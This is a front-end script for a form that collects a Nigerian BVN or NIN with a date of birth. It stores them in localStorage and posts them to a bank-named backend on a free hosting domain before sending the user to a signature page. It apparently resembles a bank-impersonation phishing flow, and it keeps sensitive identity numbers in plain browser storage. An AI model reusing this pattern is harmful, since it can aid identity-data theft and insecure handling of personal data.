AOS.init();

const checkbox = document.getElementById("agreeCheckbox");
const bvnInput = document.getElementById("bvn");
const ninInput = document.getElementById("nin");
const dobBvnInput = document.getElementById("dob-bvn");
const dobNinInput = document.getElementById("dob-nin");
const proceedBtn = document.getElementById("proceedBtn");

// Load saved input values from localStorage
window.addEventListener("load", () => {
  bvnInput.value = localStorage.getItem("bvn") || "";
  ninInput.value = localStorage.getItem("nin") || "";
  dobBvnInput.value = localStorage.getItem("dobBvn") || "";
  dobNinInput.value = localStorage.getItem("dobNin") || "";

  toggleInputStates();
  validateForm();
});

// Save or remove from localStorage dynamically
function updateLocalStorage() {
  localStorage.setItem("bvn", bvnInput.value || "");
  localStorage.setItem("nin", ninInput.value || "");
  localStorage.setItem("dobBvn", dobBvnInput.value || "");
  localStorage.setItem("dobNin", dobNinInput.value || "");

  // Clear if field is cleared
  if (!bvnInput.value) {
    localStorage.removeItem("bvn");
    localStorage.removeItem("dobBvn");
  }
  if (!ninInput.value) {
    localStorage.removeItem("nin");
    localStorage.removeItem("dobNin");
  }
}

// Enable/Disable inputs based on user input
function toggleInputStates() {
  if (bvnInput.value.length > 0) {
    ninInput.disabled = true;
    dobNinInput.disabled = true;
  } else {
    ninInput.disabled = !checkbox.checked;
    dobNinInput.disabled = !checkbox.checked;
  }

  if (ninInput.value.length > 0) {
    bvnInput.disabled = true;
    dobBvnInput.disabled = true;
  } else {
    bvnInput.disabled = !checkbox.checked;
    dobBvnInput.disabled = !checkbox.checked;
  }
}

// Validate numeric input
function validateNumberInput(input) {
  input.value = input.value.replace(/\D/g, ""); // Remove non-numeric characters
}

// Validate input fields and enable Proceed button
function validateForm() {
  if (
    (bvnInput.value.length === 11 && dobBvnInput.value) ||
    (ninInput.value.length === 11 && dobNinInput.value)
  ) {
    proceedBtn.disabled = false;
  } else {
    proceedBtn.disabled = true;
  }
}

// Event Listeners for input changes
bvnInput.addEventListener("input", function () {
  validateNumberInput(bvnInput);
  toggleInputStates();
  updateLocalStorage();
  validateForm();
});

ninInput.addEventListener("input", function () {
  validateNumberInput(ninInput);
  toggleInputStates();
  updateLocalStorage();
  validateForm();
});

dobBvnInput.addEventListener("input", () => {
  updateLocalStorage();
  validateForm();
});

dobNinInput.addEventListener("input", () => {
  updateLocalStorage();
  validateForm();
});

// Checkbox toggle behavior
checkbox.addEventListener("change", function () {
  toggleInputStates();
});

// Proceed button functionality
proceedBtn.addEventListener("click", async () => {
  const bvn = bvnInput.value.trim();
  const nin = ninInput.value.trim();

  const data = {};
  if (bvn && bvn.length === 11 && (!nin || nin.length === 0)) {
    data.bvn = bvn;
    data.dob = dobBvnInput.value;
  } else if (nin && nin.length === 11 && (!bvn || bvn.length === 0)) {
    data.nin = nin;
    data.dob = dobNinInput.value;
  } else {
    alert("Please provide either BVN or NIN, not both.");
    return;
  }

  try {
    const response = await fetch(
      "https://zenithbank-backend.onrender.com/api/users/create",
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data),
      }
    );

    const result = await response.json();

    if (response.ok) {
      localStorage.setItem("userId", result.userId);
      window.location.href = "signature.html";
    } else {
      alert(result.error);
    }
  } catch (error) {
    console.error("Error while sending data:", error);
    alert("An error occurred. Please try again.");
  }
});
